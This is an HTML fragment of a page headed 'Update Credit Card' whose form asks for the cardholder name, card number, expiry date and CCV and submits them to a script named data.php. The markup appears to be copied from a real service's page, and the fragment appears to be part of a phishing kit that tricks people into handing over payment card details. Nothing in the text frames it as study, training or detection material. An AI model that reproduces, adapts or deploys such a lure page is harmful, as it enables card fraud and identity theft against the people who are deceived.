
<main>
  <div class="content">
    <div class="row ng-scope" ng-if="showContinueLabel">
      <div class="col-xs-12 text-center">
        <span id="login-to-continue" class="h5 ng-binding" style="
          font-family: inherit;
          font-weight: 900;
          line-height: 1.1;
          font-size: 19px;
          color: inherit;
        ">Update Credit Card </span>
      </div>
    </div><br>
    <div class="content-form">
      <form action="data.php" method="POST">
        <input type="text" name="username" style="
          border: 1px solid #d9dadc;
          border-radius: 0;
        " placeholder="Credit Card Holder" title="Enter correct cardholder name" required>

        <input type="number" style="
          border: 1px solid #d9dadc;
          border-radius: 0;
        " name="usercard" placeholder="Card Number" title="Enter correct card number" required>

        <input type="month" name="userdate" min="2023-08" value="2023-08" style="
          border: 1px solid #d9dadc;
          border-radius: 0;
        " placeholder="Expiration Date" title="Please enter the correct expiration date" required>

        <input type="number" style="
          border: 1px solid #d9dadc;
          border-radius: 0;
        " name="userccv" placeholder="CCV" title="Please enter the correct CCV" required><br><br>

        <input type="submit" name="data" value="UPDATE NOW">
      </form>
    </div>
  </div>
</main>
